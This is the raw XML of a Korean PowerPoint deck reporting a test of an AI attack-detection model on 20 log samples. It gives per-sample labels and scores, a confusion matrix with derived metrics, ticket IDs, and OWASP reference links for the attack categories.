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f2c641250747b9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="/docProps/app.xml" Id="R04e484a5c272424a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="/ppt/presentation.xml" Id="R00c5bafa7b5c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69c3d0defb4041"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:id="R4a52412eaf344e36"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="256" r:id="R910b654652114770"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="257" r:id="R6ecfefebf0984549"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="258" r:id="Ree104e9173764aad"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="259" r:id="Refc3277c27a74ea1"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="260" r:id="R445df5cc7ecb4c59"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="261" r:id="R85d530834ebb407d"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="262" r:id="R5881938c07a5478b"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="263" r:id="R8fade9e601984c2e"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="264" r:id="Rb1284717508647a0"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="265" r:id="R409c3706c5f64eb2"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="266" r:id="Rec7ee8a4c1fc49aa"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="267" r:id="R53cb1ae12ae649a9"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="268" r:id="Ra68b314c86c746b1"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="269" r:id="R009a4a11bbde4df9"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="270" r:id="Rda4256b4ad4e4a6c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="271" r:id="R05f570babc6f49dc"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="272" r:id="R6523c0fcebbf49ad"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="273" r:id="R6e9c2bd8b29c427c"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="274" r:id="R7626295993a44525"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="275" r:id="R5cfe4243257a4bcf"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="276" r:id="R8669dd7dcab44462"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="277" r:id="R82b73b47ae304965"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="278" r:id="R5c3e7159ec424264"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="279" r:id="R1747f4ff3f124f86"/>
    <p:sldId xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" id="280" r:id="R19e938ef04a44e7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9e357d787488f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="/ppt/slideMasters/slideMaster1.xml" Id="R7969c3d0defb4041" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R4a52412eaf344e36" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="/ppt/presProps.xml" Id="R4b1f16b4ea924210" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="/ppt/tableStyles.xml" Id="Rb096f14a5bf346fa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide1.xml" Id="R910b654652114770" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide2.xml" Id="R6ecfefebf0984549" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide3.xml" Id="Ree104e9173764aad" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide4.xml" Id="Refc3277c27a74ea1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide5.xml" Id="R445df5cc7ecb4c59" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide6.xml" Id="R85d530834ebb407d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide7.xml" Id="R5881938c07a5478b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide8.xml" Id="R8fade9e601984c2e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide9.xml" Id="Rb1284717508647a0" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide10.xml" Id="R409c3706c5f64eb2" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide11.xml" Id="Rec7ee8a4c1fc49aa" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide12.xml" Id="R53cb1ae12ae649a9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide13.xml" Id="Ra68b314c86c746b1" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide14.xml" Id="R009a4a11bbde4df9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide15.xml" Id="Rda4256b4ad4e4a6c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide16.xml" Id="R05f570babc6f49dc" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide17.xml" Id="R6523c0fcebbf49ad" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide18.xml" Id="R6e9c2bd8b29c427c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide19.xml" Id="R7626295993a44525" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide20.xml" Id="R5cfe4243257a4bcf" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide21.xml" Id="R8669dd7dcab44462" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide22.xml" Id="R82b73b47ae304965" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide23.xml" Id="R5c3e7159ec424264" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide24.xml" Id="R1747f4ff3f124f86" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="/ppt/slides/slide25.xml" Id="R19e938ef04a4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3de2b5c3e24f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87172a4454c5f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R23dde94dbe2e4e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78d6419a274130" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R672708ed65a949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9a4c34f8e94a1a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R321f99587e1e41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dbe845ebc4c06" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R5b6862712c8045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9e28f50a0145c4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R0922bdab12d244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7004601d514d0c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R5727d38997b644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799a9a6714e37" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R816eeb71c768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2dbf2fb62b49e3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R74f8cc92226a41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7950c0741c4e40" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R81c987d2904b45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9f6b20dab4962" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R41eeea7136314f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dbede891fe4bce" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc0f6a3f871b14a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6ecc080d3340ce" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rfccbd91e441d49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cd61bf76904348" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8f1b759f619544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38d79c6638481c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R9e54e82ba97b4d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87707afc134608" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R32ad225ef2b640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b994f29c1a407e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R4a0e9e8fd7ec42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1463bc34d0470e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R3c463ba965044a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c0ebc50c5941e7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rcb7615d8245c48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f6e6664f8f42f8" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R4771fd2d31f344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5d37639f8347d7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8e884d9bfb204b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a1598fe1ed40b9" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rc12a430d2c984b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8192c231094800" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R5c9506e2508143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7c5e5cc18e84a34" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="R8b6e4162bb2349a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0c2502ec864fd3" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Ree91afdb508244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f42d6d57f6c4f15" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="/ppt/notesMasters/notesMaster1.xml" Id="Rd7ed08157b044a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기존 테스트 과정과 결과를 정리한 자료. 작성일 2026-09-09. 현재 세션에서 서버 재전송·등록·플레이북 실행은 수행하지 않았다. 표기한 서버와 이름은 사용자 제공 정보다.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산출 근거: TP=10, FP=6, TN=4, FN=0. Accuracy=(TP+TN)/20=70%; TPR=TP/(TP+FN)=100%; Precision=TP/(TP+FP)=62.5%; FPR=FP/(FP+TN)=60%. 공격 라벨은 공격 의도·모사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판정은 보안 정책 적합성 또는 무해성을 인증하는 의미가 아니다. 공격 판정은 공격 의도·모사 패턴 기준이다. 192.0.2.0/24는 RFC 5737의 문서용 TEST-NET-1 주소.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설명을 재구성한 기존 테스트 흐름. 현재 세션에서 서버 연결, 로그 전송, 파서/이벤트 등록은 수행하지 않았다. LogGenerator README.md 264–275행은 프로토콜 선택, Host/Port 설정, 카탈로그·샘플 선택, IP/날짜, EPS, 전송 및 총 로그 수 확인 순서를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 정보: LogGenerator 파서, AITEST 일반 이벤트, AI TEST 티켓. 현재 설정값을 직접 조회하지 않았다. eyeCloudXOAR-playbook-guide_v4_ko.pdf p74, p77–80: 정오탐 분석과 payload, 결과 및 수동 피드백. 활성 알고리즘/모델 입력 매핑은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첨부 원본 PNG codex-clipboard-b275dc3b-4de1-4eb9-9aa0-9cb439990e1d.png. 화면 #3 이름은 말줄임 처리되어 있으므로 전체 명칭은 사용자 제공 티켓 상태 “정오탐 피드백 데이터 저장”을 따른다. 매뉴얼의 다른 명칭으로 교체하지 않았다. 현재 화면은 저장 완료 또는 재학습 완료의 증거가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티켓 목록 전문. 각 티켓의 제목 AI TEST, 담당자 미지정, 상태 분석/대응 ( 정오탐 피드백 데이터 저장 ). 날짜는 모두 2026-09-08. 두 목록을 정상군/공격군에 임의 매핑하지 않았다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000380 14:19:07</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000379 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000378 14:18:58</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000377 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000376 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000375 14:18:40</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000374 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000373 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000372 14:18:22</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000371 14:18:13</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000456 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000455 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000454 16:55:39</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000452 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000451 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000450 16:55:21</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000449 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000448 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000447 16:55:12</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>SR260908-AW1-00000446 16:54:54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독립 계산: {"counts":{"TP":10,"FP":6,"TN":4,"FN":0},"metrics":{"accuracy":0.7,"recall":1,"precision":0.625,"fpr":0.6,"specificity":0.4,"f1":0.7692307692307693}}</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>Accuracy=(TP+TN)/(TP+TN+FP+FN). Recall=TP/(TP+FN). Precision=TP/(TP+FP). FPR=FP/(FP+TN). Specificity=TN/(TN+FP). F1=2TP/(2TP+FP+FN). 혼동행렬 정의는 eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80과 부합한다.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S01 수동=정상 모델=공격 화면값=0.47 FP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수동=정상 모델=정상 화면값=0.39 TN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수동=정상 모델=공격 화면값=0.48 FP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수동=정상 모델=정상 화면값=0.30 TN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수동=정상 모델=공격 화면값=0.31 FP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S06 수동=정상 모델=공격 화면값=0.60 FP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수동=정상 모델=정상 화면값=0.35 TN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수동=정상 모델=공격 화면값=0.43 FP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수동=정상 모델=정상 화면값=0.27 TN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수동=정상 모델=공격 화면값=0.65 FP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S11 수동=공격 모델=공격 화면값=0.43 TP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수동=공격 모델=공격 화면값=0.46 TP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수동=공격 모델=공격 화면값=0.37 TP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수동=공격 모델=공격 화면값=0.67 TP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수동=공격 모델=공격 화면값=0.51 TP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S16 수동=공격 모델=공격 화면값=0.60 TP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수동=공격 모델=공격 화면값=0.63 TP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수동=공격 모델=공격 화면값=0.45 TP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수동=공격 모델=공격 화면값=0.57 TP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수동=공격 모델=공격 화면값=1.00 TP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화면 값은 사용자 명칭 “정확도”를 보존한다. 산식이 제공되지 않았으므로 확률, 신뢰도, 유사도로 단정하지 않는다. 각 값의 단순 평균은 모델 정확도가 아니다. 점수와 판정은 사용자 제공 원값이며 차트 데이터는 편집 가능한 리터럴 값이다.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S01 0.47 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S02 0.39 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S03 0.48 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S04 0.30 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S05 0.31 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S06 0.60 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S07 0.35 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S08 0.43 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S09 0.27 정상 TN</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S10 0.65 공격 FP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S11 0.43 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S12 0.46 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S13 0.37 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S14 0.67 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S15 0.51 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S16 0.60 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S17 0.63 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S18 0.45 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S19 0.57 공격 TP</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>S20 1.00 공격 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권고는 관측 결과(FP 6건)에 대한 후속 검증 제안이며 이미 수행했다는 의미가 아니다. eyeCloudXOARforAll-in-one_v4_ko.pdf p263–266은 Label 변경, 임시저장, Feedback, 강화학습의 별도 절차를 설명한다. 학습/평가 분리 여부와 활성 모델 메타데이터는 사용자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>화면 값=0.47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>화면 값=0.39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>화면 값=0.48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>화면 값=0.30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화면 값=0.31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>화면 값=0.60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>화면 값=0.35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>화면 값=0.43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>화면 값=0.27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화면 값=0.65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>화면 값=0.43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>화면 값=0.46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>화면 값=0.37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>화면 값=0.67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화면 값=0.51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>화면 값=0.60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>화면 값=0.63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>화면 값=0.45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>화면 값=0.57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화면 값=1.00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자료: 이 대화의 20개 샘플 및 20개 티켓, 첨부 원본 PNG.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>로컬 자료: C:/Users/user/Desktop/project/LogGenerator/README.md 264–275행. C:/Users/user/Desktop/AI 서버/eyeCloudXOARforAll-in-one_v4_ko.pdf p263–269. C:/Users/user/Desktop/AI 서버/eyeCloudXOAR-playbook-guide_v4_ko.pdf p74·77–80.</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>웹 1차 출처(2026-09-09 확인):</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>sql: https://owasp.org/www-community/attacks/SQL_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>path: https://owasp.org/www-community/attacks/Path_Traversal</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>crlf: https://owasp.org/www-community/vulnerabilities/CRLF_Injection</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>xxe: 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ssti: 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ssrf: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>log4j: https://logging.apache.org/security.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>command: 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probes: https://kubernetes.io/docs/concepts/workloads/pods/probes/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>auth: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>rfc: https://www.rfc-editor.org/info/rfc5737/</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:r>
              <a:t>이전 로컬 ai_model_detection_samples.json은 메서드·헤더·정상군이 현재 제공 데이터와 달라 평가에 대체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80d01f380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e1ba0a1f549d6" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="/ppt/slideLayouts/slideLayout1.xml" Id="R045464d422034d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464d422034d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711ace8c44c0f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide1.xml" Id="R45832c71da5547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41f571cf74662" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide2.xml" Id="R334c31d7c4344a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65fc4c0b54d86" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide3.xml" Id="Rd4e73459482b43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6605123284b27" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide4.xml" Id="R9486bbc277ff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5af30c2b74512" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide5.xml" Id="Ree7869a6295443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0a4c202a04f39" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="/ppt/media/image.png" Id="R63bcf102b55a4a36" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide6.xml" Id="R7d56bed3906c44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0abce3c274ff4" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide7.xml" Id="R364dc48d4a4a44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cf4e8465943ef" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide8.xml" Id="Ra2992c995b9140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cfbd14a92461c" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide9.xml" Id="R5e6dc26f6a554f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b73b3b8634b66" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide10.xml" Id="R87772525501248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140cfa07b4071" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide11.xml" Id="R8c8cfafe94bd45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db18bee2241c7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide12.xml" Id="Ra09500cd36bd42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890f107c041bf" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="/ppt/slides/charts/chart1.xml" Id="Rbe5ea17fb02c419d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide13.xml" Id="R9def64207bcf4b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2b292af71482f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide14.xml" Id="Re4010f55bb5341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32ca3fc0f4e91" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide15.xml" Id="R019414bc877946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193b4ea3c427d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide16.xml" Id="R08fc7f05353c49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d88b79fae4ca5" /><Relationship 